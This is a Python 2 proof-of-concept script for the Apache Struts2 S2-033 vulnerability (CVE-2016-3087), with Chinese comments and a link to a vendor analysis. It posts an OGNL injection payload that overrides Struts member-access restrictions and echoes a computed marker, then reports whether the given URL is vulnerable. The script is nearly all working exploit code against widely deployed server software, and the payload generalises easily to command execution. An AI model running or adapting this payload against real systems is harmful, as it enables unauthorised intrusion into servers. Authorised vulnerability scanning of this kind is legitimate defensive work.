#!/usr/bin/env python
# -*- coding:utf-8 -*-
# S2-033 POC
# Author: CF_HB
# 时间：2016年6月6日
# 漏洞编号：CVE-2016-3087 (S2-033)
# 漏洞详情：http://blog.nsfocus.net/apache-struts2-vulnerability-technical-analysis-protection-scheme-s2-033/


import requests
import argparse

banner = u'''\
# S2-033 POC
# Author:CF_HB
# 时间：2016年6月6日
#使用说明：
# 1、检测
    python S2-033_PoC.py -u http://xxx.xxx.xxx.xxx/xx/
'''
def verity(url):
    s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
    try:
        print banner
        poc_url = url+s2033_poc
        print "[checking] " + url
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "290860253718" in res.content:
            if len(res.content) <14: # may be 12 length
                print "{url} is vulnerable S2-033.".format(url=url)
            else:
                print "{url} is not vulnerable..".format(url=url)
        else:
            print "{url} is not vulnerable..".format(url=url)
    except Exception, e:
        print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    verity(url)
except Exception,e:
    print parser.print_usage()
    exit(-1)
